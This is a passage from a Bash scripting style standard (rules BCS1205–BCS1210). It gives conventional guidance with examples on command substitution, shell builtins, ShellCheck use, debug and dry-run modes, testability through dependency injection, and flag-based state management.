  local -- prefix="$SCRIPT_NAME:" msg
  # ...
}

# Conditional messaging functions
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Unconditional messaging functions
error() { >&2 _msg "$@"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
```

**Guidelines:**
- Simple `# Description` format (no dashes, no decorations)
- Short and descriptive (2-4 words)
- Placed immediately before group
- Blank line after group
- Groups related variables, functions, or logic blocks
- Reserve 80-dash separators for major divisions only

**Common patterns:** `# Default values`, `# Derived paths`, `# Core message function`, `# Conditional messaging functions`, `# Helper functions`, `# Business logic`, `# Validation functions`


---


**Rule: BCS1205**

## Language Best Practices

#### Command Substitution
Always use `$()` instead of backticks.

```bash
# ✓ Correct
var=$(command)

# ✗ Wrong - deprecated
var=`command`
```

**Rationale:** `$()` is clearer, nests naturally without escaping, has better editor support.

**Nesting:**
```bash
# ✓ Easy with $()
outer=$(echo "inner: $(date +%T)")

# ✗ Confusing with backticks
outer=`echo "inner: \`date +%T\`"`
```

#### Builtin Commands vs External Commands
Prefer shell builtins for performance (10-100x faster) and reliability.

```bash
# ✓ Good - builtins
addition=$((x + y))
string=${var^^}  # uppercase
string=${var,,}  # lowercase
if [[ -f "$file" ]]; then

# ✗ Avoid - external commands
addition=$(expr "$x" + "$y")
string=$(echo "$var" | tr '[:lower:]' '[:upper:]')
if [ -f "$file" ]; then
```

**Rationale:** Builtins have no process creation overhead, no PATH dependency, no external binary requirements.

**Common replacements:**

| External Command | Builtin Alternative | Example |
|-----------------|---------------------|---------|
| `expr` | `$(())` | `$((x + y))` |
| `basename` | `${var##*/}` | `${path##*/}` |
| `dirname` | `${var%/*}` | `${path%/*}` |
| `tr` (case) | `${var^^}` / `${var,,}` | `${str,,}` |
| `test`/`[` | `[[` | `[[ -f "$file" ]]` |
| `seq` | `{1..10}` or `for ((i=1; i<=10; i+=1))` | Brace expansion |

**When externals are necessary:**
```bash
checksum=$(sha256sum "$file")
current_user=$(whoami)
sorted_data=$(sort "$file")
```


---


**Rule: BCS1206**

## Development Practices

#### ShellCheck Compliance
ShellCheck is **compulsory** for all scripts. Use `#shellcheck disable=...` only with documented reason explaining why.

```bash
# Document intentional violations with reason
#shellcheck disable=SC2046  # Intentional word splitting for flag expansion
set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}"

# Run shellcheck as part of development
shellcheck -x myscript.sh
```

#### Script Termination
```bash
# Always end scripts with #fin (or #end) marker
main "$@"
#fin

```

#### Defensive Programming
```bash
# Default values for critical variables
: "${VERBOSE:=0}"
: "${DEBUG:=0}"

# Validate inputs early
[[ -n "$1" ]] || die 1 'Argument required'

# Guard against unset variables
set -u
```

#### Performance Considerations
```bash
# Minimize subshells
# Use built-in string operations over external commands
# Batch operations when possible
# Use process substitution over temp files
```

#### Testing Support
```bash
# Make functions testable
# Use dependency injection for external commands
# Support verbose/debug modes
# Return meaningful exit codes
```


---


**Rule: BCS1207**

## Debugging and Development

Enable debugging features for development and troubleshooting.

```bash
# Debug mode implementation
declare -i DEBUG="${DEBUG:-0}"

# Enable trace mode when DEBUG is set
((DEBUG)) && set -x

# Enhanced PS4 for better trace output
export PS4='+ ${BASH_SOURCE##*/}:${LINENO}:${FUNCNAME[0]:+${FUNCNAME[0]}():} '

# Conditional debug output function
debug() {
  ((DEBUG)) || return 0
  >&2 _msg "$@"
}

# Usage
DEBUG=1 ./script.sh  # Run with debug output
```


---


**Rule: BCS1208**

## Dry-Run Pattern

Implement preview mode for operations that modify system state, allowing users to see what would happen without making actual changes.

```bash
# Declare dry-run flag
declare -i DRY_RUN=0

# Parse from command-line
-n|--dry-run) DRY_RUN=1 ;;
-N|--not-dry-run) DRY_RUN=0 ;;

# Pattern: Check flag, show preview message, return early
build_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would build standalone binaries'
    return 0
  fi

  # Actual build operations
  make standalone || die 1 'Build failed'
}

install_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would install:' \
         "  $BIN_DIR/mailheader" \
         "  $BIN_DIR/mailmessage" \
         "  $BIN_DIR/mailheaderclean"
    return 0
  fi

  # Actual installation operations
  install -m 755 build/bin/mailheader "$BIN_DIR"/
  install -m 755 build/bin/mailmessage "$BIN_DIR"/
  install -m 755 build/bin/mailheaderclean "$BIN_DIR"/
}
```

**Pattern structure:**
1. Check `((DRY_RUN))` at start of functions that modify state
2. Display preview message with `[DRY-RUN]` prefix using `info`
3. Return early (exit code 0) without performing operations
4. Proceed with real operations only when dry-run disabled

**Rationale:** Separates decision logic from action. Script flows through same functions whether in dry-run mode or not, enabling logic verification without side effects. Safe preview of destructive operations with identical control flow.


---


**Rule: BCS1209**

## Testing Support Patterns

Patterns for making scripts testable through dependency injection, test modes, and assertions.

```bash
# Dependency injection for testing
declare -f FIND_CMD >/dev/null || FIND_CMD() { find "$@"; }
declare -f DATE_CMD >/dev/null || DATE_CMD() { date "$@"; }
declare -f CURL_CMD >/dev/null || CURL_CMD() { curl "$@"; }

# In production
find_files() {
  FIND_CMD "$@"
}

# In tests, override:
FIND_CMD() { echo 'mocked_file1.txt mocked_file2.txt'; }

# Test mode flag
declare -i TEST_MODE="${TEST_MODE:-0}"

# Conditional behavior for testing
if ((TEST_MODE)); then
  # Use test data directory
  DATA_DIR='./test_data'
  # Disable destructive operations
  RM_CMD() { echo "TEST: Would remove $*"; }
else
  DATA_DIR='/var/lib/app'
  RM_CMD() { rm "$@"; }
fi

# Assert function for tests
assert() {
  local -- expected="$1"
  local -- actual="$2"
  local -- message="${3:-Assertion failed}"

  if [[ "$expected" != "$actual" ]]; then
    >&2 echo "ASSERT FAIL: $message"
    >&2 echo "  Expected: '$expected'"
    >&2 echo "  Actual:   '$actual'"
    return 1
  fi
  return 0
}

# Test runner pattern
run_tests() {
  local -i passed=0 failed=0
  local -- test_func

  # Find all functions starting with test_
  for test_func in $(declare -F | awk '$3 ~ /^test_/ {print $3}'); do
    if "$test_func"; then
      passed+=1
      echo " $test_func"
    else
      failed+=1
      echo " $test_func"
    fi
  done

  echo "Tests: $passed passed, $failed failed"
  ((failed == 0))
}
```


---


**Rule: BCS1210**

## Progressive State Management

Manage script state by modifying boolean flags based on runtime conditions, separating decision logic from execution.

```bash
# Initial flag declarations
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0

# Parse command-line arguments
main() {
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
    esac
    shift
  done

  # Progressive state management: adjust flags based on runtime conditions

  # If user explicitly requested to skip, disable installation
  if ((SKIP_BUILTIN)); then
    INSTALL_BUILTIN=0
  fi

  # Check if prerequisites are met, adjust flags accordingly
  if ! check_builtin_support; then
    if ((BUILTIN_REQUESTED)); then
      warn 'bash-builtins package not found, attempting to install...'
      install_bash_builtins || {
        error 'Failed to install bash-builtins package'
        INSTALL_BUILTIN=0  # Disable builtin installation
      }
    else
      info 'bash-builtins not found, skipping builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Build phase: disable on failure
  if ((INSTALL_BUILTIN)); then
    if ! build_builtin; then
      error 'Builtin build failed, disabling builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Execution phase: actions based on final flag state
  install_standalone
  ((INSTALL_BUILTIN)) && install_builtin  # Only runs if still enabled

  show_completion_message
}
```

**Pattern structure:**
1. Declare all boolean flags at top with initial values
2. Parse command-line arguments, setting flags based on user input
3. Progressively adjust flags based on runtime conditions (dependency checks, build failures, user preferences)
4. Execute actions based on final flag state

**State progression example:**
```bash
# 1. User input (--builtin flag)
INSTALL_BUILTIN=1
BUILTIN_REQUESTED=1

# 2. Override check (--no-builtin takes precedence)
((SKIP_BUILTIN)) && INSTALL_BUILTIN=0

# 3. Dependency check (no bash-builtins package)
if ! check_builtin_support; then
  if ((BUILTIN_REQUESTED)); then
    install_bash_builtins || INSTALL_BUILTIN=0  # Try to install, disable on failure
  else
    INSTALL_BUILTIN=0  # User didn't ask, just disable
  fi
fi

# 4. Build check (compilation failed)
((INSTALL_BUILTIN)) && ! build_builtin && INSTALL_BUILTIN=0

# 5. Final execution (only runs if INSTALL_BUILTIN=1)
((INSTALL_BUILTIN)) && install_builtin
```

**Benefits:**
- Clean separation between decision logic and action
- Easy to trace how flags change throughout execution
- Fail-safe behavior (disable features when prerequisites fail)
- User intent preserved (`BUILTIN_REQUESTED` tracks original request)
- Idempotent (same input � same state � same output)

**Guidelines:**
- Group related flags together (e.g., `INSTALL_*`, `SKIP_*`)
- Use separate flags for user intent vs. runtime state
- Document state transitions with comments
- Apply state changes in logical order (parse � validate � execute)
- Never modify flags during execution phase (only in setup/validation)

**Rationale:** Allows scripts to adapt to runtime conditions while maintaining clarity about why decisions were made. Especially useful for installation scripts where features may need to be disabled based on system capabilities or build failures.
#fin
